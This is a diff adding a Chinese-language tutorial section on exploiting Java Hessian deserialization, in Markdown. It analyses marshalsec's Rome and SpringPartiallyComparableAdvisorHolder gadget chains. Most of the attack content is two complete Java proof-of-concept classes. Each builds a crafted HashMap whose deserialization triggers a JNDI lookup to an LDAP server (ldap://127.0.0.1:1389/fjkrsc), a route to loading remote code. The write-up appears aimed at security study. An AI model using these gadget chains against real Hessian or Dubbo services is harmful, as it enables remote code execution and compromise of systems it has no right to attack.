@@ -226,14 +226,414 @@ public class HJessianSerialization {
 
 对于`Hessian`反序列化漏洞的利用, 可以使用[marshalsec](https://github.com/mbechler/marshalsec)工具的`Gadget`而不是`ysoserial`的`Gadget`. 这是因为`ysoserial`是针对`Java`原生反序列化漏洞的, 并没有一些如`Hessian`等非`Java`原生反序列化漏洞的`Gadgets`.
 
-针对`Hessian`反序列化的攻击, 在`marshalsec`这个工具里, 已经有了`5`个可用的`Gadgets`. 分别是:
+`Hessian`反序列化同样存在漏洞入口点在对`Map`类型反序列化处理时, 会调用`HashMap`的`put`方法, 换而言之就是会调用`key`的`hashcode`方法, 所以只要找到一条以`hashcode`开始的利用链, 就可以完成一次`Hessian`反序列化攻击. 针对`Hessian`反序列化的攻击, 在`marshalsec`这个工具里, 已经有了`5`个可用的`Gadgets`, 分别是:
  - Rome
  - XBean
  - Resin
  - SpringPartiallyComparableAdvisorHolder
  - SpringAbstractBeanFactoryPointcutAdvisor
 
+<div align=center><img src="./images/5.png"></div>
+
+## Rome
+### 构造分析
+ - 先来看看`marshalsec`中给出的`Rome.java`, 跟进`JDKUtil.makeJNDIRowSet(args[ 0 ])`语句中, `args[ 0 ]`是传进来的`ldap`地址.
+```java
+public interface Rome extends Gadget {
+
+    @Primary
+    @Args ( minArgs = 1, args = {
+        "jndiUrl"
+    }, defaultArgs = {
+        MarshallerBase.defaultJNDIUrl
+    } )
+    default Object makeRome ( UtilFactory uf, String[] args ) throws Exception {
+        return makeROMEAllPropertyTrigger(uf, JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(args[ 0 ]));
+    }
+    ...
+}
+```
+
+ - 在`makeJNDIRowSet`中, 先创建`JdbcRowSetImpl`实例, 接着调用`setDataSourceName`方法对实例的`dataSource`赋值为输入的`jndiUrl`变量, 接着调用`setMatchColumn`方法, 将`JdbcRowSetImpl`实例的`strMatchColumn`成员变量设置为`foo`, 最后将`JdbcRowSetImpl`实例的`listeners`变量设置为`null`.
+
+```java
+public static JdbcRowSetImpl makeJNDIRowSet ( String jndiUrl ) throws Exception {
+    JdbcRowSetImpl rs = new JdbcRowSetImpl();
+    rs.setDataSourceName(jndiUrl);
+    rs.setMatchColumn("foo");
+    Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
+    return rs;
+}
+```
+
+ - 接着跟进`marshalsec`中的`Rome#makeROMEAllPropertyTrigger`方法, 实例化`ToStringBean`对象, 将`JdbcRowSetImpl.class`和`JdbcRowSetImpl`实例传递到构造方法中, 接着实例化`EqualsBean`对象将`ToStringBean.class`和`ToStringBean`的实例化对象进行传递, 获取到名为`root`的实例化对象. 接着调用`uf.makeHashCodeTrigger(root)`.
+
+```java
+default <T> Object makeROMEAllPropertyTrigger ( UtilFactory uf, Class<T> type, T obj ) throws Exception {
+    ToStringBean item = new ToStringBean(type, obj);
+    EqualsBean root = new EqualsBean(ToStringBean.class, item);
+    return uf.makeHashCodeTrigger(root);
+}
+```
+
+ - 接着跟进到`UtilFactory#makeHashCodeTrigger`方法, 该方法会传递`2`个同样的对象到`JDKUtil#makeMap`方法中.
+
+```java
+default Object makeHashCodeTrigger ( Object o1 ) throws Exception {
+    return JDKUtil.makeMap(o1, o1);
+}
+```
+
+ - 跟进`JDKUtil#makeMap`方法, 先实例化`HashMap`并将长度设置为`2`, 接着反射获取`java.util.HashMap$Node`或`java.util.HashMap$Entry`, 再实例化一个对象并且设置长度为`2`, 并且第一个数据插入值为`java.util.HashMap$Node`的实例化对象, 该对象在实例化的时候传递`4`个值, 第一个值为`0`, 第二和三个值为刚刚获取并传递进来的`EqualsBean`实例化对象, 第四个为`null`. 插入的第二个数据和第一个一样, 接着通过反射设置`s`这个`hashmap`中`table`的值为反射创建的`java.util.HashMap$Node`对象.
+
+```java
+public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
+    HashMap<Object, Object> s = new HashMap<>();
+    Reflections.setFieldValue(s, "size", 2);
+    Class<?> nodeC;
+    try {
+        nodeC = Class.forName("java.util.HashMap$Node");
+    }
+    catch ( ClassNotFoundException e ) {
+        nodeC = Class.forName("java.util.HashMap$Entry");
+    }
+    Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+    nodeCons.setAccessible(true);
+
+    Object tbl = Array.newInstance(nodeC, 2);
+    Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
+    Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
+    Reflections.setFieldValue(s, "table", tbl);
+    return s;
+}
+```
+
+### POC
+```java
+package org.h3rmesk1t.Hessian;
+
+import com.caucho.hessian.io.HessianInput;
+import com.caucho.hessian.io.HessianOutput;
+import com.sun.rowset.JdbcRowSetImpl;
+import com.sun.syndication.feed.impl.EqualsBean;
+import com.sun.syndication.feed.impl.ToStringBean;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/3/11 5:07 下午
+ */
+public class RomeGadget {
+
+    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
+        try {
+            Field field = clazz.getDeclaredField(fieldName);
+            if ( field != null )
+                field.setAccessible(true);
+            else if ( clazz.getSuperclass() != null )
+                field = getField(clazz.getSuperclass(), fieldName);
+
+            return field;
+        }
+        catch ( NoSuchFieldException e ) {
+            if ( !clazz.getSuperclass().equals(Object.class) ) {
+                return getField(clazz.getSuperclass(), fieldName);
+            }
+            throw e;
+        }
+    }
+
+    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static Object JDBCInject() throws Exception {
+
+        // 反序列化时 ToStringBean.toString 会被调用, 触发 JdbcRowSetImpl.getDatabaseMetaData -> JdbcRowSetImpl.connect -> Context.lookup.
+        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
+        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
+        jdbcRowSet.setDataSourceName(jndiUrl);
+        jdbcRowSet.setMatchColumn("foo");
+        return  jdbcRowSet;
+    }
+
+    public static void main(String[] args ) throws Exception {
+
+        // 反序列化时 EqualsBean.beanHashCode 会被调用, 触发 ToStringBean.toString.
+        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, JDBCInject());
+
+        // 反序列化时 HashMap.hash 会被调用, 触发 EqualsBean.hashCode -> EqualsBean.beanHashCode.
+        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
+
+        // HashMap.put -> HashMap.putVal -> HashMap.hash
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        setFieldValue(hashMap, "size", 2);
+        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, equalsBean, equalsBean, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, equalsBean, equalsBean, null));
+        setFieldValue(hashMap, "table", tbl);
+
+        // Hessian 序列化数据
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
+        hessianOutput.writeObject(hashMap);
+        byte[] serializedData = byteArrayOutputStream.toByteArray();
+        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));
+
+        // Hessian 反序列化数据
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
+        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
+        hessianInput.readObject();
+    }
+}
+```
+
+<div align=center><img src="./images/6.png"></div>
+
+## SpringPartiallyComparableAdvisorHolder
+### 构造分析
+ - 先来看看`marshalsec`中给出的`SpringPartiallyComparableAdvisorHolder.java`, 这里将传入的`jndiUrl`传入`SpringUtil#makeJNDITrigger`方法.
+
+```java
+public interface SpringPartiallyComparableAdvisorHolder extends Gadget {
+
+    @Primary
+    @Args ( minArgs = 1, args = {
+        "jndiUrl"
+    }, defaultArgs = {
+        MarshallerBase.defaultJNDIUrl
+    } )
+    default Object makePartiallyComparableAdvisorHolder ( UtilFactory uf, String[] args ) throws Exception {
+        String jndiUrl = args[ 0 ];
+        BeanFactory bf = SpringUtil.makeJNDITrigger(jndiUrl);
+        return SpringUtil.makeBeanFactoryTriggerPCAH(uf, jndiUrl, bf);
+    }
+}
+```
+
+ - 跟进`SpringUtil#makeJNDITrigger`方法, 会继续调用`SimpleJndiBeanFactory#setShareableResources`方法, 该方法会将`jndiUrl`转换成一个`list`对象, 然后调用`this.shareableResources.addAll`方法对`shareableResources`的`HashSet`进行`addAll`操作. 接着获取`bf`, 设置`logger`的值为`NoOpLog`实例化对象, 用同样的方式对获取的`bf.getJndiTemplate()`进行操作. 最后返回`bf`的`BeanFactory`实例化对象.
+
+```java
+public static BeanFactory makeJNDITrigger ( String jndiUrl ) throws Exception {
+    SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
+    bf.setShareableResources(jndiUrl);
+    Reflections.setFieldValue(bf, "logger", new NoOpLog());
+    Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
+    return bf;
+}
+```
+
+```java
+public void setShareableResources(String... shareableResources) {
+    this.shareableResources.addAll(Arrays.asList(shareableResources));
+}
+```
+
+ - 继续跟进`SpringPartiallyComparableAdvisorHolder#makeBeanFactoryTriggerPCAH`方法, 先创建`BeanFactoryAspectInstanceFactory`的实例化对象, 并将`bf`变量和`name`分别反射赋值到`beanFactory`和`name`中. 接着创建`AbstractAspectJAdvice`对象, 将`aspectInstanceFactory`的值, 设置为`aif`变量对象进行传递. 并将`advice`的`declaringClass`、`methodName`、`parameterTypes`分别设置为`Object.class`、`toString`、`new Class[0]`, 创建`AspectJPointcutAdvisor`对象, 将前面设置了一系列值的`advice`放置到`advisor`对象的`advice`变量中. 最后创建`org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder`对象, 将`advisor`设置到该对象的`advisor`成员变量中, 并且调用`uf.makeToStringTriggerUnstable(pcah)`.
+
+```java
+public static Object makeBeanFactoryTriggerPCAH ( UtilFactory uf, String name, BeanFactory bf ) throws ClassNotFoundException,
+        NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
+    AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
+    Reflections.setFieldValue(aif, "beanFactory", bf);
+    Reflections.setFieldValue(aif, "name", name);
+    AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
+    Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
+
+    // make readObject happy if it is called
+    Reflections.setFieldValue(advice, "declaringClass", Object.class);
+    Reflections.setFieldValue(advice, "methodName", "toString");
+    Reflections.setFieldValue(advice, "parameterTypes", new Class[0]);
+
+    AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
+    Reflections.setFieldValue(advisor, "advice", advice);
+
+    Class<?> pcahCl = Class
+            .forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
+    Object pcah = Reflections.createWithoutConstructor(pcahCl);
+    Reflections.setFieldValue(pcah, "advisor", advisor);
+    return uf.makeToStringTriggerUnstable(pcah);
+}
+```
+
+ - 接着跟进`UtilFactory#makeToStringTriggerUnstable`, 继续会调用`ToStringUtil#makeToStringTrigger`方法. 然后会调用到`JDKUtil#makeMap`方法, 这里与`RomeGadget`后面的分析一样了.
+
+```java
+Object makeToStringTriggerUnstable ( Object obj ) throws Exception;
+
+
+default Object makeToStringTriggerStable ( Object obj ) throws Exception {
+    return ToStringUtil.makeToStringTrigger(obj);
+}
+```
+
+```java
+public static Object makeToStringTrigger ( Object o, Function<Object, Object> wrap ) throws Exception {
+    String unhash = unhash(o.hashCode());
+    XString xString = new XString(unhash);
+    return JDKUtil.makeMap(wrap.apply(o), wrap.apply(xString));
+}
+```
+
+### POC
+在`POC`中的序列化部分多出来了几行代码, 这是因为, 一般对于对象的序列化, 如果对象对应的`class`没有对`java.io.Serializable`进行实现`implement`的话, 是没办法序列化的, 所以这里对输出流进行了设置, 使其可以输出没有实现`java.io.Serializable`接口的对象.
+```java
+package org.h3rmesk1t.Hessian;
+
+import com.caucho.hessian.io.*;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import org.apache.commons.logging.impl.NoOpLog;
+import org.springframework.aop.aspectj.AbstractAspectJAdvice;
+import org.springframework.aop.aspectj.AspectInstanceFactory;
+import org.springframework.aop.aspectj.AspectJAroundAdvice;
+import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
+import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
+import org.springframework.aop.target.HotSwappableTargetSource;
+import org.springframework.jndi.support.SimpleJndiBeanFactory;
+import sun.reflect.ReflectionFactory;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.HashMap;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/3/11 6:26 下午
+ */
+public class SpringPartiallyComparableAdvisorHolderGadget {
+
+    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
+        try {
+            Field field = clazz.getDeclaredField(fieldName);
+            if ( field != null )
+                field.setAccessible(true);
+            else if ( clazz.getSuperclass() != null )
+                field = getField(clazz.getSuperclass(), fieldName);
+
+            return field;
+        }
+        catch ( NoSuchFieldException e ) {
+            if ( !clazz.getSuperclass().equals(Object.class) ) {
+                return getField(clazz.getSuperclass(), fieldName);
+            }
+            throw e;
+        }
+    }
+
+    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
+            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
+        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
+    }
+
+    @SuppressWarnings ( {
+            "unchecked"
+    } )
+    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
+                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
+        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
+        objCons.setAccessible(true);
+        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
+        sc.setAccessible(true);
+        return (T) sc.newInstance(consArgs);
+    }
+
+    public static void main(String[] args) throws Exception {
+
+        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
+        SimpleJndiBeanFactory beanFactory = new SimpleJndiBeanFactory();
+        beanFactory.addShareableResource(jndiUrl);
+
+        // 反序列化时 BeanFactoryAspectInstanceFactory.getOrder 会被调用, 会触发调用 SimpleJndiBeanFactory.getType -> SimpleJndiBeanFactory.doGetType -> SimpleJndiBeanFactory.doGetSingleton -> SimpleJndiBeanFactory.lookup -> JndiTemplate.lookup.
+        setFieldValue(beanFactory, "logger", new NoOpLog());
+        setFieldValue(beanFactory.getJndiTemplate(), "logger", new NoOpLog());
+
+        // 反序列化时 AspectJAroundAdvice.getOrder 会被调用, 会触发 BeanFactoryAspectInstanceFactory.getOrder.
+        AspectInstanceFactory aspectInstanceFactory = createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
+        setFieldValue(aspectInstanceFactory, "beanFactory", beanFactory);
+        setFieldValue(aspectInstanceFactory, "name", jndiUrl);
+
+        // 反序列化时 AspectJPointcutAdvisor.getOrder 会被调用, 会触发 AspectJAroundAdvice.getOrder.
+        AbstractAspectJAdvice advice = createWithoutConstructor(AspectJAroundAdvice.class);
+        setFieldValue(advice, "aspectInstanceFactory", aspectInstanceFactory);
+
+        // 反序列化时 PartiallyComparableAdvisorHolder.toString 会被调用, 会触发 AspectJPointcutAdvisor.getOrder.
+        AspectJPointcutAdvisor advisor = createWithoutConstructor(AspectJPointcutAdvisor.class);
+        setFieldValue(advisor, "advice", advice);
+
+        // 反序列化时 Xstring.equals 会被调用, 会触发 PartiallyComparableAdvisorHolder.toString.
+        Class<?> pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
+        Object pcah = createWithoutConstructor(pcahCl);
+        setFieldValue(pcah, "advisor", advisor);
+
+        // 反序列化时 HotSwappableTargetSource.equals 会被调用, 触发 Xstring.equals.
+        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(pcah);
+        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString("h3rmesk1t"));
+
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        setFieldValue(hashMap, "size", 2);
+        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, hotSwappableTargetSource1, hotSwappableTargetSource1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, hotSwappableTargetSource2, hotSwappableTargetSource2, null));
+        setFieldValue(hashMap, "table", tbl);
+
+        // Hessian 序列化数据
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
+        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
+        serializableFactory.setAllowNonSerializable(true);
+        hessianOutput.setSerializerFactory(serializableFactory);
+        hessianOutput.writeObject(hashMap);
+        byte[] serializedData = byteArrayOutputStream.toByteArray();
+        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));
+
+        // Hessian 反序列化数据
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
+        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
+        hessianInput.readObject();
+    }
+}
+```
+
+<div align=center><img src="./images/6.png"></div>
+
 
 
 # 参考
  - [Hessian 反序列化及相关利用链](https://paper.seebug.org/1131/)
+ - [Java安全之Dubbo反序列化漏洞分析](https://www.anquanke.com/post/id/263274)
